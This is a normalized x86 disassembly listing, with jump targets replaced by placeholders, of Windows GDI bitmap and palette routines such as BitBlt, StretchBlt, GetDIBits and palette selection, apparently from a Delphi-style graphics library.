mov eax [ ebp + 0xc ]
call sub_4277d0
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_402988
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_424958
jmp r-xdata
mov eax [ ebp - 0x24 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_4236b8
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_418d68
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_4229f8
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_42367c
call sub_4229f8
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_42411c
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427def
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_4241c4
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_427dbe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_4241c4
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
call sub_4027ac
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_4229f8
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_42367c
call sub_4229f8
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_4229f8
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_42367c
call sub_4229f8
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_4241c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
call sub_403a54
call sub_403a54
jmp r-xdata
sub_427e11
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_427e20
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_4039d0
call sub_403a24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_427e80
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp + 0x4 ] 0x300
mov ax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_427ee4
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectA
test eax eax
je r-xdata
mov eax ebx
call sub_4273d8
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4280df
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_4241c4
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_4241c4
mov [ ebp - 0x10 ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_4241c4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_428097
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
mov ecx esi
mov edx esi
mov eax ebx
call sub_42781c
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_4280f0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_425344
mov [ edi + 0x34 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_427648
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
test bl bl
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_428158
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax esi
call sub_428868
mov eax [ esi + 0x28 ]
call sub_42764c
mov eax [ esi + 0x2c ]
call sub_40321c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a714
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_428194
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_42824c
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402c30
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_428ad8
mov esi ebx
mov eax [ esi + 0x28 ]
call sub_427648
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_42764c
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov al [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov al [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41a740
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_428284
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_428868
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_428313
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_427e80
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_42781c
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_428ad8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_428318
mov eax [ ebp - 0x8 ]
call sub_422128
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_4039d0
call sub_403a24
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_428344
push ebx
mov ebx eax
mov eax ebx
call sub_428638
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
call sub_40d3ac
pop ebx
retn
sub_428374
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_41be60
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_428868
lea eax [ ebx + 0x2c ]
call sub_40d3ac
push esp
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_428ad8
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_4283e8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_423ea0
mov eax ebx
call sub_428978
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_428774
test al al
jne r-xdata
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_428624
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_423dcc
push eax
call SetStretchBltMode
mov eax ebx
call sub_4286b8
mov dl [ r-xdata ]
call sub_423ea0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
mov eax ebx
call sub_428918
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_4286b8
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42862b
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4285b9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_4241c4
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_4286b8
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_424368
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_428638
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_428878
cmp [ ebx + 0x71 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_428284
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_42411c
sub_4286b8
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_428878
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_427454
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0x2c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x28 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] sub_428344
sub_428700
push ebx
mov ebx eax
mov eax ebx
call sub_428868
mov eax ebx
call sub_428878
mov edx ebx
mov eax ebx
call sub_428344
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_428724
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_4287a4
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_4229f8
mov eax ebx
call sub_428774
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
push eax
mov eax ebx
call sub_4286b8
xor edx edx
pop ecx
call sub_423d58
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_4287f4
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_428978
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_42781c
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectA
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
mov cx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_428878
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_41bdfc
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_4288fb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_428918
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_428868
mov eax ebx
call sub_428878
mov esi [ ebx + 0x28 ]
mov eax ebx
call sub_4287a4
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_427ee4
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_4273d8
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_428978
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov cx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_4248b4
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_4273d8
push 0x0
call GetDC
call sub_4241c4
mov esi eax
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x71 ] bl
test bl bl
je r-xdata
sub_428a30
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_42408c
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_428284
mov eax [ esi + 0x28 ]
mov [ eax + 0x70 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_428868
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_402c30
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectA
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_428ab4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_41bddc
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_429168
pop esi
pop ebx
retn
sub_428ad8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_428b5f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
